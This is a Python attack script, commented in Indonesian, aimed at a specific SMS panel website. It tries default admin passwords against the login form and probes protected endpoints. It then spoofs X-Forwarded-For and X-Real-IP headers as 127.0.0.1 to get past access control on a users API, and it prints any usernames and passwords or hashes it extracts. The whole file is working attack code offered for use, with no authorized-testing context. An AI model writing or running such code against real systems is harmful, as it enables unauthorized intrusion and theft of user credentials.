import requests
from bs4 import BeautifulSoup
import json
import gzip

class IPRNCredentialVerification:
    def __init__(self):
        self.base_url = "https://panel.iprn-sms.com"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
    
    def verify_credential(self, username, password):
        """Verifikasi credentials dengan detail analysis"""
        print(f"\n{'='*70}")
        print(f"  VERIFYING: {username}:{password}")
        print(f"{'='*70}")
        
        try:
            # Test 1: POST to /login
            print("\n[*] Test 1: POST to /login")
            payload = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }
            
            r = self.session.post(
                f'{self.base_url}/login',
                data=payload,
                allow_redirects=False,
                timeout=15
            )
            
            print(f"    Status: {r.status_code}")
            print(f"    Content-Length: {len(r.content)}")
            
            if r.status_code == 302:
                redirect = r.headers.get('Location', '')
                print(f"    Redirect Location: {redirect}")
                
                if 'dashboard' in redirect or 'admin' in redirect or 'panel' in redirect:
                    print(f"    [SUCCESS] Redirect to protected area!")
                    
                    # Follow redirect
                    r2 = self.session.get(f'{self.base_url}{redirect}', timeout=10)
                    print(f"    Dashboard Status: {r2.status_code}")
                    
                    if r2.status_code == 200:
                        print(f"    [CONFIRMED] Dashboard accessible!")
                        return True
            
            # Decode response
            try:
                content = r.content
                if r.headers.get('Content-Encoding') == 'gzip':
                    content = gzip.decompress(content)
                
                html = content.decode('utf-8', errors='ignore')
                
                print(f"    Decoded length: {len(html)}")
                
                # Cari success indicators
                success_keywords = ['dashboard', 'welcome', 'logout', 'account', 'balance', 'settings']
                error_keywords = ['invalid', 'wrong', 'incorrect', 'failed', 'error']
                
                found_success = [kw for kw in success_keywords if kw in html.lower()]
                found_errors = [kw for kw in error_keywords if kw in html.lower()]
                
                if found_success:
                    print(f"    Success keywords found: {found_success}")
                if found_errors:
                    print(f"    Error keywords found: {found_errors}")
                
                # Parse form untuk cek apakah masih di login page
                soup = BeautifulSoup(html, 'html.parser')
                forms = soup.find_all('form')
                
                if forms:
                    for form in forms:
                        action = form.get('action', '')
                        if 'login' in action.lower():
                            print(f"    [FAILED] Still on login form")
                            return False
                
                # Cek cookies
                if self.session.cookies:
                    print(f"    Cookies received:")
                    for name, value in self.session.cookies.items():
                        print(f"      {name}: {value[:50]}...")
                
                # Print preview
                print(f"\n    HTML Preview (first 500 chars):")
                print(f"    {html[:500]}")
                
            except Exception as e:
                print(f"    Decode error: {e}")
            
            # Test 2: Try accessing protected endpoints dengan session
            print("\n[*] Test 2: Accessing protected endpoints")
            
            protected_urls = [
                '/dashboard',
                '/admin',
                '/panel',
                '/account',
                '/api/user',
                '/api/profile'
            ]
            
            for url in protected_urls:
                try:
                    r = self.session.get(f'{self.base_url}{url}', timeout=10, allow_redirects=False)
                    
                    if r.status_code == 200:
                        print(f"    [+] {url} - ACCESSIBLE (Status: 200)")
                        
                        # Decode dan cek content
                        try:
                            content = r.content
                            if r.headers.get('Content-Encoding') == 'gzip':
                                content = gzip.decompress(content)
                            text = content.decode('utf-8', errors='ignore')
                            
                            if len(text) > 100 and 'login' not in text.lower()[:500]:
                                print(f"        Content length: {len(text)} - Looks legitimate!")
                                print(f"        Preview: {text[:200]}")
                                return True
                        except:
                            pass
                            
                    elif r.status_code == 302:
                        location = r.headers.get('Location', '')
                        print(f"    [-] {url} - REDIRECT to {location}")
                        
                except Exception as e:
                    pass
            
            return False
            
        except Exception as e:
            print(f"    [ERROR] {e}")
            return False
    
    def deep_api_extraction(self):
        """Extract data dari /api/users yang accessible"""
        print(f"\n{'='*70}")
        print(f"  EXTRACTING DATA FROM /api/users")
        print(f"{'='*70}")
        
        try:
            bypass_headers = {
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1'
            }
            
            r = requests.get(
                f'{self.base_url}/api/users',
                headers={**self.session.headers, **bypass_headers},
                timeout=15
            )
            
            if r.status_code == 200:
                print(f"[+] API accessible! Status: {r.status_code}")
                
                # Decode gzip
                try:
                    content = gzip.decompress(r.content)
                except:
                    content = r.content
                
                # Decode text
                text = content.decode('utf-8', errors='ignore')
                print(f"[+] Decoded length: {len(text)} chars")
                
                # Try parse as JSON
                try:
                    data = json.loads(text)
                    print(f"[+] Valid JSON response!")
                    print(json.dumps(data, indent=2))
                    
                    # Extract credentials jika ada
                    if isinstance(data, list):
                        for user in data:
                            if isinstance(user, dict):
                                username = user.get('username') or user.get('email') or user.get('name')
                                password = user.get('password') or user.get('pass')
                                
                                if username:
                                    print(f"\n[!!!] USER FOUND: {username}")
                                    if password:
                                        print(f"      Password/Hash: {password}")
                    
                    elif isinstance(data, dict):
                        print(f"\n[+] Dictionary response - checking for user data...")
                        print(json.dumps(data, indent=2)[:1000])
                    
                    return data
                    
                except json.JSONDecodeError:
                    print(f"[*] Not JSON format. Raw text preview:")
                    print(text[:1000])
                    return text
                    
        except Exception as e:
            print(f"[ERROR] {e}")
        
        return None
    
    def run_verification(self):
        print("="*70)
        print("  CREDENTIAL VERIFICATION & DATA EXTRACTION")
        print("  Time: 2026-09-03 17:56 UTC")
        print("="*70)
        
        # Outlier credentials dari analisa sebelumnya
        outliers = [
            ('admin', 'password'),
            ('admin', 'letmein'),
        ]
        
        results = []
        
        for username, password in outliers:
            result = self.verify_credential(username, password)
            if result:
                results.append((username, password))
                print(f"\n[!!!] VALID CREDENTIAL CONFIRMED: {username}:{password}")
        
        # Extract dari API
        api_data = self.deep_api_extraction()
        
        # Final summary
        print("\n" + "="*70)
        print("  FINAL SUMMARY")
        print("="*70)
        
        if results:
            print(f"\n[SUCCESS] Valid credentials found:")
            for username, password in results:
                print(f"  Username: {username}")
                print(f"  Password: {password}")
        else:
            print(f"\n[INFO] No valid credentials confirmed via login")
            print(f"[INFO] However, /api/users endpoint is accessible with header bypass")
            
        if api_data:
            print(f"\n[INFO] API data extracted - see above for details")
        
        return results, api_data


if __name__ == "__main__":
    verifier = IPRNCredentialVerification()
    creds, api_data = verifier.run_verification()
